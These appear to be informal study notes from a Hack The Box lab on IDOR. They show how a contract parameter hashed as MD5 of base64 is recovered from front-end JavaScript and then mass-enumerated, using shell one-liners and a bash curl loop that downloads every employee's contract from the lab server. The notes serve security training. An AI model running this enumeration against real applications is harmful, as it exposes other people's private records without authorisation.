
Simply we want to find how the parameter was encrypted, and then encrypt our payloads the same way and pass it to the server.

---

 IDOR that uses employee uids in clear text ( ?uid=1 ) , making it easy to enumerate, but in some cases, web applications make hashes or encode ( ?uid=cfgttnhr ) their object references, making enumeration more difficult.

Let's go to the `Employee Manager` web application to test the `Contracts` functionality:
![Employee Contracts with links to 'Contracts' and 'Employment_contract.pdf'](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/134/web_attacks_idor_contracts.jpg)

If we click on the `Employment_contract.pdf` file, it starts downloading the file. The intercepted request in Burp looks as follows:

![HTTP POST request to /download.php with contract parameter 'cdd96d3cc73d1dbdaffa03c6cd7339b' and headers including Host, Content-Length, and User-Agent](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/134/web_attacks_idor_download_contract.jpg)

We see that it is sending a `POST` request to `download.php` with the following data:

Code: php

```php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

This seems to be a md5, but if we check md5 of common examples like `uid`, `username`, `filename`, and many others, but still no success.

```shell-session
# Example checking MD5 of 1

echo -n 1 | md5sum

c4ca4238a0b923820dcc509a6f75849b -
```

You may us burp, hashcat, JtR to crack this if good then great, but if the parameter is unique (not in dictionary) then GAME. 

However, there's one fatal flaw in this web application.

## Function Disclosure

Many web developers may make the mistake of performing sensitive functions on the front-end, which would expose them to attackers

 For example, if the above hash was being calculated on the front-end, we can study the function and then replicate what it's doing to calculate the same hash.

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

Ohh boi, it first does the BASE_64 of it and and then MD5 of that BASE_64

```shell-session
echo -n 1 | base64 -w 0 | md5sum

# **Tip:** We are using the `-n` flag with `echo`, and the `-w 0` flag with `base64`, to avoid adding newlines, in order to be able to calculate the `md5` hash of the same value, without hashing newlines, as that would change the final `md5` hash.

cdd96d3cc73d1dbdaffa03cc6cd7339b -
```

yo, it matches with the hash we found above while intercepting the request.

---
## Mass Enumeration

```shell-session
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

# `tr -d` to remove the trailing `-` characters


cdd96d3cc73d1dbdaffa03cc6cd7339b
0b7e7dee87b1c3b98e72131173dfbbbf
0b24df25fe628797b3a50ae0724d2730
f7947d50da7a043693a592b4db43b0a1
8b9af1f7f76daf0f02bd9c48c4a2e3d0
006d1236aee3f92b8322299796ba1989
b523ff8d1ced96cef9c86492e790c2fb
d477819d240e7d3dd9499ed8d23e7158
3e57e65a34ffcb2e93cb545d024f5bde
5d4aace023dc088767b4e08c79415dcd
```

Next, we can make a `POST` request on `download.php` with each of the above hashes as the `contract` value, which should give us our final script:

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

With that, we can run the script, and it should download all contracts for employees 1-10:

  Bypassing Encoded References

```shell-session
hellopriyanshu2702@htb[/htb]$ bash ./exploit.sh
hellopriyanshu2702@htb[/htb]$ ls -1

contract_006d1236aee3f92b8322299796ba1989.pdf
contract_0b24df25fe628797b3a50ae0724d2730.pdf
contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
contract_3e57e65a34ffcb2e93cb545d024f5bde.pdf
contract_5d4aace023dc088767b4e08c79415dcd.pdf
contract_8b9af1f7f76daf0f02bd9c48c4a2e3d0.pdf
contract_b523ff8d1ced96cef9c86492e790c2fb.pdf
contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
contract_d477819d240e7d3dd9499ed8d23e7158.pdf
contract_f7947d50da7a043693a592b4db43b0a1.pdf
```

Example

encrypted parameter
![[Pasted image 20251231011809.png]]

Source code
![[Pasted image 20251231011921.png]]

it just does URL encoding of the base 64 encoding
![[Pasted image 20251231012123.png]]

![[Pasted image 20251231012254.png]]

![[Pasted image 20251231014448.png]]

![[Pasted image 20251231014536.png]]

![[Pasted image 20251231014611.png]]

![[Pasted image 20251231014630.png]]